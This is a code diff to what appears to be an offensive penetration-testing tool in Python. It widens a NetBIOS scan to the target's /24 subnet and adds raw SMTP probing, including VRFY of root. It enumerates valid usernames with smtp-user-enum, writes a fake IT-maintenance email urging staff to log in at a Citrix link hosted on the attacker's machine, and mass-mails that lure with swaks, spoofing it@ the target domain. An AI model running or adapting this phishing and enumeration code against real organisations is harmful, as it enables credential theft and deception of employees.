@@ -21,6 +21,7 @@ import getopt
 import base64
 import string
 import random
+import socket
 import hashlib
 import os.path
 import sqlite3
@@ -320,15 +321,19 @@ def checkInterface(variable, COM):
    return COM       
    
 def checkBIOS():
-   print(colored("[*] Checking windows network neighborhood protocol...", colour3))
-   remotCOM("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
-   localCOM("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
-   localCOM("sed -i '/^$/d' ./bios.tmp")
-   nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
-   if nullTest == "":
-      print("[-] No netbios information found...")
+   if IP46 == "-6":
+      return
    else:
-      catsFile("bios.tmp")
+      print(colored("[*] Checking windows network neighborhood protocol...", colour3))
+      bit1, bit2, bit3, bit4 = TIP.split(".")
+      remotCOM("nbtscan -rv " + bit1 + "." + bit2 + "." + bit3 + ".0/24 > bios.tmp")
+      localCOM("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
+      localCOM("sed -i '/^$/d' ./bios.tmp")
+      nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
+      if nullTest == "":
+         print("[-] No netbios information found...")
+      else:
+         catsFile("bios.tmp")
    return
    
 def networkSweep():
@@ -465,7 +470,7 @@ def fileCheck(variable):
          USER[x] = spacePadding(USER[x], COL3)         
       wipeTokens(VALD)
    else:
-      print("[!] Checked file " + variable + " contains data...")
+      print("[+] Checked file " + variable + ", the file contains data...")
    return
    
 def dispBanner(variable,flash):
@@ -1195,6 +1200,7 @@ while True:
                
          if DNSC == 1:
             COM = checkInterface("DNS", COM)
+            networkSweep()
             checkBIOS()
             
          prompt()    
@@ -1245,8 +1251,8 @@ while True:
                   
          if checkParams == 1:
             COM = checkInterface("TIP", COM)
-            checkBIOS()
             networkSweep()
+            checkBIOS()
          else:
             print("[-] Unknown internet protocol...")
             TIP = spacePadding("EMPTY", COL1)           
@@ -3326,7 +3332,52 @@ while True:
       if checkParams != 1:
          checkParams = getPort()        
          
-         if checkParams != 1:
+         if checkParams != 1:                     
+            print(colored("[*] Checking for valid usernames...", colour3))
+            fileCheck(dataDir + "/usernames.txt")  
+                      
+            print(colored("[*] Checking SNMP communications...", colour3))            
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connect = s.connect((TIP.rstrip(" "),25))            
+            print("[+] Connected to " + TIP.rstrip(" ") + ":25...\n")
+            banner = s.recv(1024)
+            print(colored(banner, colour6))   
+                     
+            print("\n[+] Saying hello...\n")
+            if "ESMTP" in str(banner):
+               string = "EHLO Rogue.Agent\r\n"
+            else:
+               string = "HELO Rogue.Agent\r\n"
+            s.send(bytes(string.encode()))
+            result = s.recv(1024)
+            print(colored(result, colour6))
+            
+            print("\n[+] Specifying my email address...\n")
+            string = "MAIL FROM:<rogue@agent.com>\r\n"
+            s.send(bytes(string.encode()))
+            mailResponce = s.recv(1024)
+            print(colored(mailResponce, colour6))            
+            
+            print("\n[+] Verifying user root@" + DOM.rstrip(" ") + "...\n")            
+            string = "VRFY root\r\n"
+            s.send(bytes(string.encode()))
+            comCheck = s.recv(1024)
+            print(colored(comCheck, colour6))            
+            
+            print("\n[+] Asking for help...\n")            
+            string = "HELP\r\n"
+            s.send(bytes(string.encode()))
+            result = s.recv(1024)
+            print(colored(result, colour6)) 
+            
+            s.close()
+            
+            if "unrecognized" in str(comCheck):
+               print("\n[-] Looks like there is a communication issue...")
+            else:
+               print("\n[+] Communications established...")
+               
+            print(colored("[*] Creating corporate looking phishing email...\n", colour3))
             localCOM('echo "Hello.\n" > body.tmp')
             localCOM('echo "We just performed maintenance on our servers." >> body.tmp')
             localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
@@ -3334,39 +3385,37 @@ while True:
             localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
             localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
             localCOM('echo "\nRegards," >> body.tmp')
-            localCOM('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                  
-            print(colored("[*] Created phishing email...\n", colour3))
-         
-            print(colored("Subject: Credentials/Errors", colour6))  
+            localCOM('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                           
+            print(colored("Subject: Immediate action required", colour6))  
             catsFile("body.tmp")
-                      
-            print(colored("[*] Checking for valid usernames, please wait...", colour3))
-            fileCheck(dataDir + "/usernames.txt")
-            
+
+            print(colored("[*] Bruteforceing usernames, please wait...", colour3))
             remotCOM("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m VRFY " + DOM.rstrip(" ") + " 25 -V > valid1.tmp")
             localCOM("cat valid1.tmp | grep SUCC > valid2.tmp")             
-            localCOM("tr -cd '\11\12\15\40-\176' < valid2.tmp > valid.tmp")         
-         
-            match = 0                           
+            localCOM("tr -cd '\11\12\15\40-\176' < valid2.tmp > valid.tmp")            
             
-            with open("valid.tmp", "r") as list:			# PARSE FILE
-               for line in list:
-                  line.encode('ascii',errors='ignore')
-                  line = line.rstrip("\n")
-                  line = line.replace('[92m','')
-                  line = line.replace('[00m','')
-                  line = line.replace('[SUCC] ', '')
-                  line = line.replace('250 OK', '')
-                  line = line.replace('...', '')
-                  line = line.replace(' ','')               
+            match = 0            
+            count = lineCount("valid.tmp")                  
+            
+            if count > 0:             
+               with open("valid.tmp", "r") as list:			# PARSE FILE
+                  for line in list:
+                     line.encode('ascii',errors='ignore')
+                     line = line.rstrip("\n")
+                     line = line.replace('[92m','')
+                     line = line.replace('[00m','')
+                     line = line.replace('[SUCC] ', '')
+                     line = line.replace('250 OK', '')
+                     line = line.replace('...', '')
+                     line = line.replace(' ','')               
                   
-                  if "TEST" not in line:                  
-                     localCOM("echo " + line + " >> phish.tmp")
-                     print(colored(line + "@" + DOM.rstrip(" "),colour6))
-                     match = 1   
+                     if "TEST" not in line:                  
+                        localCOM("echo " + line + " >> phish.tmp")
+                        print(colored(line + "@" + DOM.rstrip(" "),colour6))
+                        match = 1   
                      
             if match == 0:
-               print("[-] Phish not found, phishing the list anyway..")       
+               print("[-] No phish was found, phishing the list anyway..")
                       
             print(colored("[*] Starting phishing server...", colour3))            
             dispBanner("GONE PHISHING",0)               
@@ -3382,7 +3431,7 @@ while True:
                   phish = phish.strip(" ")
                   phish = phish + "@"
                   phish = phish + DOM.rstrip(" ")
-                  remotCOM("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                  remotCOM("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                   print("[+] Mail sent to " + phish + "...")                              
       prompt()
       
